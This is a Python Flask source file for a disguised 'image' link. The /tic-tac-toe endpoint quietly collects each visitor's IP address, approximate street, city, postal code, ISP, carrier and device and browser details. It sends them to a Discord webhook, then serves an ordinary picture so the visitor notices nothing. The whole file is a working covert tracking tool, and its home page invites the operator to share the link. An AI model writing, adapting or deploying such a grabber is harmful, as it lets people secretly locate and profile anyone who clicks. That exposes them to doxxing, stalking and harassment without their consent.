import os
import json
import time
import requests
import logging
from datetime import datetime
from flask import Flask, request, Response, redirect, jsonify

# Import all helpers from utils
from utils import (
    get_ip_info,
    reverse_geocode,
    parse_user_agent,
    detect_vpn,
    get_additional_headers,
    get_carrier_info
)

# Initialize Flask app
app = Flask(__name__)

# ------------------- CONFIGURATION -------------------
WEBHOOK_URL = os.getenv("WEBHOOK_URL")          # set in vercel.json or environment
IMAGE_URL = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSP3C9B_ASgVH1eKGNgCyx9YiTUF_3o0yEKrA7g7aerzizSD_N594ajvHqN&s=10"
PUBLIC_URL = os.getenv("VERCEL_URL", "https://image-ktri.vercel.app")   # change if needed

# Logging setup (Vercel logs will capture this)
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ------------------- HELPER: send to Discord webhook -------------------
def send_webhook(data):
    """Send captured data as a rich embed to your Discord webhook."""
    if not WEBHOOK_URL:
        logger.warning("WEBHOOK_URL not set, skipping webhook send.")
        return

    try:
        # Build the embed fields
        fields = [
            {"name": "IP Address", "value": data.get("ip", "N/A"), "inline": True},
            {"name": "VPN Status", "value": data.get("vpn_status", "Off"), "inline": True},
            {"name": "ISP / Organisation", "value": data.get("isp", "N/A"), "inline": True},
            {"name": "Street (approx)", "value": data.get("street", "Unknown"), "inline": True},
            {"name": "City", "value": data.get("city", "N/A"), "inline": True},
            {"name": "State/Region", "value": data.get("region", "N/A"), "inline": True},
            {"name": "Country", "value": data.get("country", "N/A"), "inline": True},
            {"name": "Postal Code", "value": data.get("postal", "N/A"), "inline": True},
            {"name": "Timezone", "value": data.get("timezone", "N/A"), "inline": True},
            {"name": "Carrier / Mobile Network", "value": data.get("carrier", "N/A"), "inline": True},
            {"name": "Device Model", "value": data.get("device_model", "N/A"), "inline": True},
            {"name": "Device Type", "value": data.get("device_type", "N/A"), "inline": True},
            {"name": "Operating System", "value": data.get("os", "N/A"), "inline": True},
            {"name": "Browser", "value": data.get("browser", "N/A"), "inline": True},
            {"name": "Browser Version", "value": data.get("browser_version", "N/A"), "inline": True},
            {"name": "CPU Architecture", "value": data.get("cpu", "N/A"), "inline": True},
            {"name": "Screen Resolution", "value": data.get("screen_resolution", "N/A"), "inline": True},
            {"name": "Language", "value": data.get("language", "N/A"), "inline": True},
            {"name": "Referrer", "value": data.get("referrer", "Direct"), "inline": False},
            {"name": "Timestamp (UTC)", "value": data.get("timestamp", "N/A"), "inline": False}
        ]

        embed = {
            "embeds": [{
                "title": "🕵️ Image Click Logged",
                "color": 0x00ff00,
                "fields": fields,
                "footer": {"text": "IP Logger • Real-time Monitoring"},
                "timestamp": datetime.utcnow().isoformat() + "Z"
            }]
        }

        response = requests.post(WEBHOOK_URL, json=embed, timeout=5)
        if response.status_code != 204:
            logger.error(f"Webhook error: {response.status_code} - {response.text}")
    except Exception as e:
        logger.error(f"Webhook send failed: {e}")

# ------------------- MAIN ENDPOINT: /tic-tac-toe -------------------
@app.route('/tic-tac-toe')
def tic_tac_toe():
    # 1. Get visitor's IP (handles proxies)
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()

    # 2. Get IP info from ipinfo.io
    geo_data = get_ip_info(ip)   # returns dict with city, region, country, loc, org, etc.

    # 3. Reverse geocode to get street name (without number)
    street = "Unknown"
    if geo_data and geo_data.get('lat') and geo_data.get('lon'):
        try:
            street = reverse_geocode(geo_data['lat'], geo_data['lon'])
        except Exception as e:
            logger.error(f"Reverse geocode failed: {e}")

    # 4. Parse User-Agent and additional headers
    ua_string = request.headers.get('User-Agent', '')
    device_info = parse_user_agent(ua_string)
    headers_info = get_additional_headers(request)

    # 5. Detect VPN status
    vpn_status = detect_vpn(geo_data.get('org', ''))

    # 6. Get carrier (mobile network) info – if available
    carrier = get_carrier_info(geo_data.get('org', ''))

    # 7. Build comprehensive log data
    log_data = {
        "ip": ip,
        "vpn_status": vpn_status,
        "street": street,
        "city": geo_data.get("city", "Unknown"),
        "region": geo_data.get("region", "Unknown"),
        "country": geo_data.get("country", "Unknown"),
        "postal": geo_data.get("postal", "Unknown"),
        "timezone": geo_data.get("timezone", "Unknown"),
        "isp": geo_data.get("org", "Unknown"),
        "carrier": carrier,
        "device_model": device_info.get("device_model", "Unknown"),
        "device_type": device_info.get("device_type", "Unknown"),
        "os": device_info.get("os", "Unknown"),
        "browser": device_info.get("browser", "Unknown"),
        "browser_version": device_info.get("browser_version", "Unknown"),
        "cpu": device_info.get("cpu", "Unknown"),
        "screen_resolution": headers_info.get("screen_resolution", "Unknown"),
        "language": headers_info.get("language", "Unknown"),
        "referrer": headers_info.get("referrer", "Direct"),
        "timestamp": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
    }

    # 8. Send to Discord webhook
    send_webhook(log_data)

    # 9. Proxy and return the image
    try:
        resp = requests.get(IMAGE_URL, stream=True, timeout=10)
        return Response(resp.raw.read(), content_type=resp.headers.get('content-type', 'image/jpeg'))
    except Exception as e:
        logger.error(f"Image proxy error: {e}")
        # Fallback: redirect to original image
        return redirect(IMAGE_URL)

# ------------------- HEALTH CHECK / HOME -------------------
@app.route('/')
def home():
    return "Tic-Tac-Toe Logger is active. Share: /tic-tac-toe"

@app.route('/health')
def health():
    return jsonify({"status": "ok", "timestamp": datetime.utcnow().isoformat()})

# ------------------- ERROR HANDLERS -------------------
@app.errorhandler(404)
def not_found(e):
    return jsonify({"error": "Not found"}), 404

@app.errorhandler(500)
def internal_error(e):
    return jsonify({"error": "Internal server error"}), 500

# ------------------- MAIN (for local dev) -------------------
if __name__ == '__main__':
    app.run(debug=True)
